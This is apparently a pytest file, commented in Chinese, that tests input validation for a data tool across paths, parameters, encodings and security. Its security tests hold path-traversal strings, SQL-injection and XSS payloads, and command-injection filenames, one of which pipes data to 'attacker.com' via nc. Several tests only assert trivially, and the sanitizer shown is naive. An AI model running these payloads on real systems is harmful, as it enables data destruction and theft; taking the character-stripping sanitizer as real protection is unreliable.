"""
邊界測試 - 輸入驗證

測試檔案路徑、參數和安全性相關的邊界情況
"""

import os
from pathlib import Path

import pytest


class TestPathBoundaries:
    """測試檔案路徑邊界情況"""

    def test_empty_path(self):
        """測試空路徑"""
        empty_path = ""

        # 空路徑 resolve 為 cwd，但開啟時應失敗（因為 cwd 是目錄非檔案）
        resolved = Path(empty_path).resolve()
        assert resolved == Path.cwd()
        with pytest.raises((IsADirectoryError, FileNotFoundError, OSError)):
            with open(resolved / "__nonexistent__.csv") as f:
                f.read()

    def test_nonexistent_file(self):
        """測試不存在的檔案"""
        nonexistent = "/tmp/this_file_definitely_does_not_exist_12345.csv"

        assert not os.path.exists(nonexistent)

        with pytest.raises(FileNotFoundError):
            with open(nonexistent, "r") as f:
                f.read()

    def test_path_traversal_attempt(self):
        """測試路徑遍歷攻擊嘗試"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "../../../../../../etc/passwd",
        ]

        for malicious_path in malicious_paths:
            # 應該被驗證函數拒絕
            # 假設有一個路徑驗證函數
            def is_safe_path(path: str, allowed_dirs: list) -> bool:
                """檢查路徑是否安全"""
                abs_path = os.path.abspath(path)
                return any(abs_path.startswith(os.path.abspath(d)) for d in allowed_dirs)

            # 測試驗證
            allowed = ["/data/sample_data", "/data/projects"]
            assert not is_safe_path(malicious_path, allowed)

    def test_extremely_long_path(self):
        """測試超長路徑"""
        # Linux 路徑限制通常是 4096 字元
        long_path = "/tmp/" + "a" * 5000 + ".csv"

        # 應該優雅處理或限制
        if len(long_path) > 4096:
            # 預期系統會拒絕或截斷
            pass

    def test_special_chars_in_filename(self):
        """測試檔名中的特殊字元"""
        special_names = [
            "test file.csv",  # 空格
            "test:file.csv",  # 冒號 (Windows 不允許)
            "test|file.csv",  # 管道符號
            "test<file>.csv",  # 角括號
            'test"file".csv',  # 引號
        ]

        for name in special_names:
            # 應該清理或轉義特殊字元
            safe_name = name.replace(":", "_").replace("|", "_").replace("<", "_").replace(">", "_").replace('"', "_")
            assert ":" not in safe_name
            assert "|" not in safe_name

    def test_relative_vs_absolute_path(self):
        """測試相對路徑vs絕對路徑處理"""
        relative = "sample_data/iris.csv"
        absolute = "/data/sample_data/iris.csv"

        # 相對路徑應該被轉換為絕對路徑
        abs_relative = os.path.abspath(relative)
        assert os.path.isabs(abs_relative)

        # 絕對路徑應該保持不變
        abs_absolute = os.path.abspath(absolute)
        assert abs_absolute == absolute


class TestParameterBoundaries:
    """測試參數邊界情況"""

    def test_negative_time_limit(self):
        """測試負數時間限制"""
        time_limit = -100

        # 應該拒絕負數
        assert time_limit < 0

        with pytest.raises(ValueError):
            if time_limit < 0:
                raise ValueError("Time limit must be positive")

    def test_zero_time_limit(self):
        """測試零時間限制"""
        time_limit = 0

        # 應該使用預設值或拒絕
        default_time_limit = 300
        actual_time = time_limit if time_limit > 0 else default_time_limit

        assert actual_time == default_time_limit

    def test_huge_time_limit(self):
        """測試超大時間限制"""
        time_limit = 999999999
        max_allowed = 86400  # 24 hours

        # 應該限制最大值
        actual_time = min(time_limit, max_allowed)
        assert actual_time == max_allowed

    def test_invalid_method_name(self):
        """測試無效的方法名稱"""
        valid_methods = ["pearson", "spearman", "kendall"]
        invalid_method = "invalid_method_xyz"

        # 應該列出可用方法
        assert invalid_method not in valid_methods

        with pytest.raises(ValueError) as exc_info:
            if invalid_method not in valid_methods:
                raise ValueError(f"Invalid method. Choose from: {valid_methods}")

        assert "Choose from" in str(exc_info.value)

    def test_empty_column_list(self):
        """測試空欄位列表"""
        columns = []

        # 應該使用全部欄位或返回錯誤
        if not columns:
            # 預設行為：使用全部欄位
            pass

        assert isinstance(columns, list)

    def test_duplicate_column_names(self):
        """測試重複的欄位名稱"""
        columns = ["age", "weight", "age"]  # 'age' 重複

        # 應該去重或警告
        unique_columns = list(set(columns))
        assert len(unique_columns) < len(columns)

    def test_out_of_range_alpha(self):
        """測試超出範圍的 alpha 值"""
        # Alpha 應該在 0 到 1 之間
        invalid_alphas = [-0.1, 1.5, 2.0]

        for alpha in invalid_alphas:
            assert not (0 < alpha < 1)

            with pytest.raises(ValueError):
                if not (0 < alpha < 1):
                    raise ValueError("Alpha must be between 0 and 1")

    def test_invalid_percentage(self):
        """測試無效的百分比值"""
        # 百分比應該在 0 到 100 之間
        invalid_percentages = [-10, 150, 1000]

        for pct in invalid_percentages:
            assert not (0 <= pct <= 100)


class TestSecurityBoundaries:
    """測試安全相關邊界"""

    def test_sql_injection_in_string(self):
        """測試 SQL 注入字串"""
        malicious_inputs = ["' OR '1'='1", "'; DROP TABLE users; --", "1' UNION SELECT * FROM users--"]

        for malicious in malicious_inputs:
            # 應該清理或拒絕
            # 假設有一個清理函數
            def sanitize_input(value: str) -> str:
                """清理輸入以防注入"""
                dangerous_chars = ["'", '"', ";", "--", "/*", "*/"]
                for char in dangerous_chars:
                    value = value.replace(char, "")
                return value

            cleaned = sanitize_input(malicious)
            assert "'" not in cleaned
            assert ";" not in cleaned

    def test_command_injection_attempt(self):
        """測試命令注入嘗試"""
        malicious_commands = ["file.csv; rm -rf /", "file.csv && cat /etc/passwd", "file.csv | nc attacker.com 1234"]

        for cmd in malicious_commands:
            # 應該偵測並拒絕
            dangerous_operators = [";", "&&", "||", "|", "`", "$"]
            is_dangerous = any(op in cmd for op in dangerous_operators)

            if is_dangerous:
                # 應該拒絕
                assert True

    def test_xss_in_html_output(self):
        """測試 XSS 攻擊字串"""
        malicious_html = '<script>alert("XSS")</script>'

        # HTML 輸出應該轉義
        def escape_html(text: str) -> str:
            """轉義 HTML 特殊字元"""
            return (
                text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#x27;")
            )

        escaped = escape_html(malicious_html)
        assert "<script>" not in escaped
        assert "&lt;script&gt;" in escaped

    def test_file_size_limit(self):
        """測試檔案大小限制"""
        max_file_size = 100 * 1024 * 1024  # 100MB

        # 建立一個超大檔案模擬
        simulated_file_size = 500 * 1024 * 1024  # 500MB

        if simulated_file_size > max_file_size:
            # 應該拒絕
            with pytest.raises(ValueError):
                if simulated_file_size > max_file_size:
                    raise ValueError(f"File too large: {simulated_file_size} > {max_file_size}")

    def test_rate_limiting_check(self):
        """測試 Rate Limiting 邏輯"""
        max_requests_per_minute = 60

        # 模擬請求計數
        request_count = 65

        if request_count > max_requests_per_minute:
            # 應該被限制
            assert request_count > max_requests_per_minute


class TestEncodingBoundaries:
    """測試編碼邊界情況"""

    def test_utf8_encoding(self):
        """測試 UTF-8 編碼"""
        text = "測試 Test 🎉"

        # 應該正確處理 UTF-8
        encoded = text.encode("utf-8")
        decoded = encoded.decode("utf-8")

        assert decoded == text

    def test_latin1_encoding(self):
        """測試 Latin-1 編碼"""
        text = "Café"

        # 應該能處理不同編碼
        encoded = text.encode("latin-1")
        decoded = encoded.decode("latin-1")

        assert decoded == text

    def test_encoding_error_handling(self):
        """測試編碼錯誤處理"""
        # 某些字元無法用 ASCII 編碼
        text = "中文"

        with pytest.raises(UnicodeEncodeError):
            text.encode("ascii")

        # 應該有錯誤處理或自動偵測編碼
        safe_encoded = text.encode("ascii", errors="ignore")
        assert safe_encoded == b""  # 中文字元被忽略


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
